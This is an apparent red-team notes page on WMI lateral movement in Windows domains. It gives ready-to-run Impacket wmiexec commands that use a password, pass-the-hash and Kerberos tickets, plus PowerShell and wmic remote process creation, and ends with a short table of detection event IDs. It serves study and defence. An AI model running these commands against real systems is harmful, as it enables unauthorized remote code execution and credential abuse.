---
title: "Attack #58 — WMI Lateral Movement"
description: "WMI (Windows Management Instrumentation) enables remote process execution via the Win32_Process.Create() method. WMI-based execution is the stealthiest…"
category: active-directory
tags: ["active-directory", "kerberos", "lateral-movement", "hashing"]
tools: ["Impacket", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Seven/⚫ Attack #58 — WMI Lateral Movement.md"
---
# ⚫ Attack #58 — WMI Lateral Movement

***

## 📖 How It Works

WMI (Windows Management Instrumentation) enables remote process execution via the `Win32_Process.Create()` method. WMI-based execution is **the stealthiest Impacket execution method** — it doesn't create services, doesn't write files to disk, and runs commands in the context of the authenticated user (not SYSTEM).

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Local admin on target** | Required for WMI access |
| **WMI / DCOM ports** | TCP 135 + dynamic RPC |

***

## 💻 Full Commands

```bash
# ── Impacket wmiexec.py (best stealth) ────────────────────────────────────────
wmiexec.py corp.local/Administrator:'Password1'@10.10.10.10

# ── PtH ───────────────────────────────────────────────────────────────────────
wmiexec.py corp.local/Administrator@10.10.10.10 -hashes :2b576acbe6bcfda7294d6bd18041b8fe

# ── Kerberos ──────────────────────────────────────────────────────────────────
export KRB5CCNAME=admin.ccache
wmiexec.py -k -no-pass corp.local/Administrator@DC01.corp.local

# ── Single command ────────────────────────────────────────────────────────────
wmiexec.py corp.local/Administrator:'Password1'@10.10.10.10 "ipconfig /all"
```

```powershell
# ── Native PowerShell / wmic ──────────────────────────────────────────────────
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\Temp\out.txt" -ComputerName TARGET
wmic /node:TARGET process call create "cmd.exe /c whoami > C:\Temp\out.txt"
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4624** | Security Log | Logon Type 3 via WMI |
| **4688** | Security Log | cmd.exe spawned by WmiPrvSE.exe |

***

> ✅ **Attack #58 — WMI Lateral Movement complete.**
